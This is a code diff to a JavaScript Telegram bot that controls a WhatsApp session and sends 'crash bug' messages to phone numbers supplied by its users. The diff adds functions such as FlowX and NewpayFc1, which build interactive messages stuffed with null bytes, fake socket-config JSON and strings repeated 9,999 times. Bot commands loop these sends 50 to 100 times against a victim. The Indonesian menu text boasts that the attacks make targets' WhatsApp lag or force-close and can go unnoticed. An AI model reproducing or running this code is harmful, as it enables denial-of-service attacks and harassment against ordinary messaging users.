@@ -15,6 +15,43 @@ let OwnerUsers = JSON.parse(fs.readFileSync('./VampDB/Owner.json'));
 let adminUsers = JSON.parse(fs.readFileSync('./VampDB/admin.json'));
 let bannedUser = JSON.parse(fs.readFileSync('./VampDB/banned.json'));
 let securityUser = JSON.parse(fs.readFileSync('./VampDB/security.json'));
+let venomModsData = JSON.stringify({
+    status: true,
+    criador: "VenomMods",
+    resultado: {
+        type: "md",
+        ws: {
+            _events: { "CB:ib,,dirty": ["Array"] },
+            _eventsCount: 800000,
+            _maxListeners: 0,
+            url: "wss://web.whatsapp.com/ws/chat",
+            config: {
+                version: ["Array"],
+                browser: ["Array"],
+                waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
+                sockCectTimeoutMs: 20000,
+                keepAliveIntervalMs: 30000,
+                logger: {},
+                printQRInTerminal: false,
+                emitOwnEvents: true,
+                defaultQueryTimeoutMs: 60000,
+                customUploadHosts: [],
+                retryRequestDelayMs: 250,
+                maxMsgRetryCount: 5,
+                fireInitQueries: true,
+                auth: { Object: "authData" },
+                markOnlineOnsockCect: true,
+                syncFullHistory: true,
+                linkPreviewImageThumbnailWidth: 192,
+                transactionOpts: { Object: "transactionOptsData" },
+                generateHighQualityLinkPreview: false,
+                options: {},
+                appStateMacVerification: { Object: "appStateMacData" },
+                mobile: true
+            }
+        }
+    }
+});
 const owner = global.owner;
 const cooldowns = new Map();
 const axios = require('axios');
@@ -411,6 +448,45 @@ async function VampireGroupInvis(target, ptcp = true) {
         console.error("Error sending newsletter:", err);
     }
 }
+async function FlowX(target) {
+  let msg = await generateWAMessageFromContent(
+    target,
+    {
+      viewOnceMessage: {
+        message: {
+          interactiveMessage: {
+            header: {
+              title: "",
+              hasMediaAttachment: false,
+            },
+            body: {
+              text: "puki",
+            },
+            nativeFlowMessage: {
+              messageParamsJson: "",
+              buttons: [
+                {
+                  name: "single_select",
+                  buttonParamsJson: venomModsData + "\u0000",
+                },
+                {
+                  name: "call_permission_request",
+                  buttonParamsJson: venomModsData + "𝐍𝐮𝐥𝐥 𝐂𝐫𝐚𝐬𝐡𝐞𝐫🐉",
+                },
+              ],
+            },
+          },
+        },
+      },
+    },
+    {}
+  );
+
+  await sock.relayMessage(target, msg.message, {
+    messageId: msg.key.id,
+    participant: { jid: target },
+  });
+}
 async function VampireNewUi(target, Ptcp = true) {
   try {
     await sock.relayMessage(
@@ -748,6 +824,55 @@ target,
 );
 }
 // SPECIAL VAMPIRE BUG
+async function NewpayFc1(target) {
+    sock.relayMessage(
+        target,
+        {
+            interactiveMessage: {
+                header: {
+                    title: "戋ざ Zoro Crasher Gen 2 戋ざ",
+                    hasMediaAttachment: false
+                },
+                body: {
+                    text: "🦄드림 가이 Kino-Хороший",
+                },
+                nativeFlowMessage: {
+                    messageParamsJson: "",
+                    buttons: [
+                        { name: "single_select", buttonParamsJson: venomModsData + "🦄드림 가이 Kino-Хороший".repeat(9999) },
+                        { name: "payment_method", buttonParamsJson: venomModsData + "🦄드림 가이 Kino-Хороший".repeat(9999) },
+                        { name: "call_permission_request", buttonParamsJson: venomModsData + "🦄드림 가이 Kino-Хороший".repeat(9999), voice_call: "call_galaxy" },
+                        { name: "form_message", buttonParamsJson: venomModsData + "🦄드림 가이 Kino-Хороший".repeat(9999) },
+                        { name: "wa_payment_learn_more", buttonParamsJson: venomModsData + "🦄드림 가이 Kino-Хороший".repeat(9999) },
+                        { name: "wa_payment_transaction_details", buttonParamsJson: venomModsData + "🦄드림 가이 Kino-Хороший".repeat(9999) },
+                        { name: "wa_payment_fbpin_reset", buttonParamsJson: venomModsData + "🦄드림 가이 Kino-Хороший".repeat(9999) },
+                        { name: "catalog_message", buttonParamsJson: venomModsData + "🦄드림 가이 Kino-Хороший".repeat(9999) },
+                        { name: "payment_info", buttonParamsJson: venomModsData + "🦄드림 가이 Kino-Хороший".repeat(9999) },
+                        { name: "review_order", buttonParamsJson: venomModsData + "🦄드림 가이 Kino-Хороший".repeat(9999) },
+                        { name: "send_location", buttonParamsJson: venomModsData + "🦄드림 가이 Kino-Хороший".repeat(9999) },
+                        { name: "payments_care_csat", buttonParamsJson: venomModsData + "🦄드림 가이 Kino-Хороший".repeat(9999) },
+                        { name: "view_product", buttonParamsJson: venomModsData + "🦄드림 가이 Kino-Хороший".repeat(9999) },
+                        { name: "payment_settings", buttonParamsJson: venomModsData + "🦄드림 가이 Kino-Хороший".repeat(9999) },
+                        { name: "address_message", buttonParamsJson: venomModsData + "🦄드림 가이 Kino-Хороший".repeat(9999) },
+                        { name: "automated_greeting_message_view_catalog", buttonParamsJson: venomModsData + "🦄드림 가이 Kino-Хороший".repeat(9999) },
+                        { name: "open_webview", buttonParamsJson: venomModsData + "🦄드림 가이 Kino-Хороший".repeat(9999) },
+                        { name: "message_with_link_status", buttonParamsJson: venomModsData + "🦄드림 가이 Kino-Хороший".repeat(9999) },
+                        { name: "payment_status", buttonParamsJson: venomModsData + "🦄드림 가이 Kino-Хороший".repeat(9999) },                        { name: "galaxy_costum", buttonParamsJson: venomModsData + "🦄드림 가이 Kino-Хороший".repeat(9999) },
+                        { name: "extensions_message_v2", buttonParamsJson: venomModsData + "🦄드림 가이 Kino-Хороший".repeat(9999) },
+                        { name: "landline_call", buttonParamsJson: venomModsData + "🦄드림 가이 Kino-Хороший".repeat(9999) },
+                        { name: "mpm", buttonParamsJson: venomModsData + "🦄드림 가이 Kino-Хороший".repeat(9999) },
+                        { name: "cta_copy", buttonParamsJson: venomModsData + "🦄드림 가이 Kino-Хороший".repeat(9999) },
+                        { name: "cta_url", buttonParamsJson: venomModsData + "🦄드림 가이 Kino-Хороший".repeat(9999) },
+                        { name: "review_and_pay", buttonParamsJson: venomModsData + "🦄드림 가이 Kino-Хороший".repeat(9999) },
+                        { name: "galaxy_message", buttonParamsJson: venomModsData + "🦄드림 가이 Kino-Хороший".repeat(9999) },
+                        { name: "cta_call", buttonParamsJson: venomModsData + "🦄드림 가이 Kino-Хороший".repeat(9999) }
+                    ]
+                }
+            }
+        },
+        { participant: { jid: target } }
+    );
+}
 async function VampCrashCH(target) {
   const msg = generateWAMessageFromContent(target, {
     interactiveMessage: {
@@ -1479,16 +1604,24 @@ bot.onText(/\/bugmenu/, (msg) => {
   const tanggal = `${now.getDate()} - ${now.toLocaleString('id-ID', { month: 'long' })} - ${now.getFullYear()}`;
   let ligma = `
 Hellow I am Bot Ranz Tele ᯤ Ready to carry out the task  友
-╭━━━━━━━━━━━━━━━━━━
-│ Select Type Crash > Delay
-╭━━━━━━━━━━━━━━━━━━
-│ Owners : @abee1945
-╭━━━━━━━━━━━━━━━━━
-│ 語  /superdelay
-│ 語  /bakios
-│ 語  /buginvis
-│
-╰━━━━━━━━━━━━━━━━━━
+            
+ 𝘉 𝘜 𝘎 - 𝘚 𝘌 𝘓 𝘌 𝘊 𝘛 𝘐 𝘖 𝘕
+──────────────────────────
+#- RanzDelayMention
+▢ /delaymention 628xxx
+╰➤ Bug ini akan mengakibatkan target delay dan tidak bisa mengirim chat dengan leluasa, keuntungan bug ini invisible ( tidak terlihat di hp target ) jadi bebas bug sepuasnya tanpa takut ketahuan atau diblokir
+
+#- RanzBugForceClose
+▢ /forceclose 628xxx
+╰➤ Bug ini akan melakukan spam bug kepada target setiap kali bug masuk maka target akan force close (keluar dari wa) kekurangan bug ini target dapat melihat nomor bot yg mengirimkan bug dan bisa saja diblokir 
+
+#- RanzBugFrezechat
+▢ /frezechat 628xxx
+╰➤ Bug ini sama seperti delaymention bedanya bug ini melakukan bug langsung kepada target, berbeda dengan delaymention yg melakukan bug melalui sw. target akan ditag di sw bug tersebut 
+
+#- RanzBugIOS
+▢ /bakios 628xxx
+╰➤ Bug ini adalah Bug iPhone/ios silahkan dites untuk yg ada iphone
 
 - © 𝐑𝐚𝐧𝐳𝐢𝐬𝐆𝐎𝐎𝐃 ᯤ`;
   bot.sendPhoto(chatId, "https://d.uguu.se/EppqczQR.jpg", {
@@ -1650,7 +1783,7 @@ bot.onText(/\/cooldown (\d+)m/i, (msg, match) => {
   cooldownTime = newCooldown * 60; // Ubah ke detik
   return bot.sendMessage(chatId, `✅ Cooldown time successfully set to ${newCooldown} menit.`);
 });
-bot.onText(/\/vampori(?:\s(.+))?/, async (msg, match) => {
+bot.onText(/\/frezechat(?:\s(.+))?/, async (msg, match) => {
     const senderId = msg.from.id;
     const chatId = msg.chat.id;
 
@@ -1661,7 +1794,7 @@ bot.onText(/\/vampori(?:\s(.+))?/, async (msg, match) => {
         return bot.sendMessage(chatId, "❌ Lu Siapa Ngentot!!! Bukan Premium Mau Access Bot");
     }
     if (!match[1]) {
-        return bot.sendMessage(chatId, "❌ Missing input. Please provide a target number. Example: /vampori 62×××.");
+        return bot.sendMessage(chatId, "❌ Missing input. Please provide a target number. Example: /frezechat 62×××.");
     }
 
     const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
@@ -1672,7 +1805,7 @@ bot.onText(/\/vampori(?:\s(.+))?/, async (msg, match) => {
     const formatedNumber = numberTarget + "@s.whatsapp.net";
 
     // Kirim pesan awal dengan gambar
-    await bot.sendPhoto(chatId, "https://files.catbox.moe/wfhaut.webp", {
+    await bot.sendPhoto(chatId, "https://d.uguu.se/EppqczQR.jpg", {
         caption: `┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━━┓
 ┃ Mᴏʜᴏɴ ᴍᴇɴᴜɴɢɢᴜ...
 ┃ Bᴏᴛ sᴇᴅᴀɴɢ ᴏᴘᴇʀᴀsɪ ᴘᴇɴɢɪʀɪᴍᴀɴ ʙᴜɢ
@@ -1680,22 +1813,22 @@ bot.onText(/\/vampori(?:\s(.+))?/, async (msg, match) => {
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
     });
 
-    for (let i = 0; i < 5; i++) { // Kirim 3 kali langsung
-        await VampOri(formatedNumber);
+    for (let i = 0; i < 50; i++) { // Kirim 3 kali langsung
+        await NewpayFc1(formatedNumber);
     }
 
     // Kirim pesan setelah selesai dengan gambar lain
-    await bot.sendPhoto(chatId, "https://files.catbox.moe/ecepcb.jpg", {
+    await bot.sendPhoto(chatId, "https://d.uguu.se/EppqczQR.jpg", {
         caption: `
 ┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━┓
 ┃         〢𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗦𝗲𝗻𝘁 𝗕𝘂𝗴 𝘁𝗼〢
 ┃〢 Tᴀʀɢᴇᴛ : ${numberTarget}
-┃〢 Cᴏᴍᴍᴀɴᴅ : /vampori
-┃〢 Wᴀʀɴɪɴɢ : ᴊᴇᴅᴀ 3 ᴍᴇɴɪᴛ ʏᴀ ᴋɪᴅs
+┃〢 Cᴏᴍᴍᴀɴᴅ : /frezechat
+┃〢 Wᴀʀɴɪɴɢ : ᴊᴇᴅᴀ 20 ᴍᴇɴɪᴛ ʏᴀ ᴋɪᴅs
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
     });
 });
-bot.onText(/\/superdelay(?:\s(.+))?/, async (msg, match) => {
+bot.onText(/\/supgherdelay(?:\s(.+))?/, async (msg, match) => {
     const senderId = msg.from.id;
     const chatId = msg.chat.id;
 
@@ -1772,7 +1905,7 @@ bot.onText(/\/superdelay(?:\s(.+))?/, async (msg, match) => {
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
     });
 });
-bot.onText(/\/hardelay(?:\s(.+))?/, async (msg, match) => {
+bot.onText(/\/hardeljjdhday(?:\s(.+))?/, async (msg, match) => {
     const senderId = msg.from.id;
     const chatId = msg.chat.id;
 
@@ -1864,7 +1997,7 @@ bot.onText(/\/bakios(?:\s(.+))?/, async (msg, match) => {
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
     });
 });
-bot.onText(/\/buginvis(?:\s(.+))?/, async (msg, match) => {
+bot.onText(/\/delaymention(?:\s(.+))?/, async (msg, match) => {
     const senderId = msg.from.id;
     const chatId = msg.chat.id;
 
@@ -1894,7 +2027,7 @@ bot.onText(/\/buginvis(?:\s(.+))?/, async (msg, match) => {
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
     });
 
-    for (let i = 0; i < 800; i++) { // Kirim 3 kali langsung
+    for (let i = 0; i < 500; i++) { // Kirim 3 kali langsung
         await protocolbug2(formatedNumber);
     }
 
@@ -1909,7 +2042,7 @@ bot.onText(/\/buginvis(?:\s(.+))?/, async (msg, match) => {
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
     });
 });
-bot.onText(/\/system(?:\s(.+))?/, async (msg, match) => {
+bot.onText(/\/forceclose(?:\s(.+))?/, async (msg, match) => {
     const senderId = msg.from.id;
     const chatId = msg.chat.id;
 
@@ -1939,8 +2072,8 @@ bot.onText(/\/system(?:\s(.+))?/, async (msg, match) => {
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
     });
 
-    for (let i = 0; i < 5; i++) { // Kirim 3 kali langsung
-        await VampCrashUi(formatedNumber);
+    for (let i = 0; i < 100; i++) { // Kirim 3 kali langsung
+        await FlowX(formatedNumber);
     }
 
     // Kirim notifikasi setelah selesai dengan gambar lain
@@ -2256,16 +2389,24 @@ bot.on("callback_query", async (callbackQuery) => {
             });
         } else if (action === "bugmenu") {
             let ligma = `Hellow I am Bot Ranz Tele ᯤ Ready to carry out the task  友
-╭━━━━━━━━━━━━━━━━━━
-│ Select Type Crash > Delay
-╭━━━━━━━━━━━━━━━━━━
-│ Owners : @abee1945
-╭━━━━━━━━━━━━━━━━━
-│ 語  /superdelay
-│ 語  /bakios
-│ 語  /buginvis
-│
-╰━━━━━━━━━━━━━━━━━━
+            
+ 𝘉 𝘜 𝘎 - 𝘚 𝘌 𝘓 𝘌 𝘊 𝘛 𝘐 𝘖 𝘕
+──────────────────────────
+#- RanzDelayMention
+▢ /delaymention 628xxx
+╰➤ Bug ini akan mengakibatkan target delay dan tidak bisa mengirim chat dengan leluasa, keuntungan bug ini invisible ( tidak terlihat di hp target ) jadi bebas bug sepuasnya tanpa takut ketahuan atau diblokir
+
+#- RanzBugForceClose
+▢ /forceclose 628xxx
+╰➤ Bug ini akan melakukan spam bug kepada target setiap kali bug masuk maka target akan force close (keluar dari wa) kekurangan bug ini target dapat melihat nomor bot yg mengirimkan bug dan bisa saja diblokir 
+
+#- RanzBugFrezechat
+▢ /frezechat 628xxx
+╰➤ Bug ini sama seperti delaymention bedanya bug ini melakukan bug langsung kepada target, berbeda dengan delaymention yg melakukan bug melalui sw. target akan ditag di sw bug tersebut 
+
+#- RanzBugIOS
+▢ /bakios 628xxx
+╰➤ Bug ini adalah Bug iPhone/ios silahkan dites untuk yg ada iphone
 
 - © 𝐑𝐚𝐧𝐳𝐢𝐬𝐆𝐎𝐎𝐃 ᯤ`;
   bot.sendPhoto(chatId, "https://d.uguu.se/EppqczQR.jpg", {
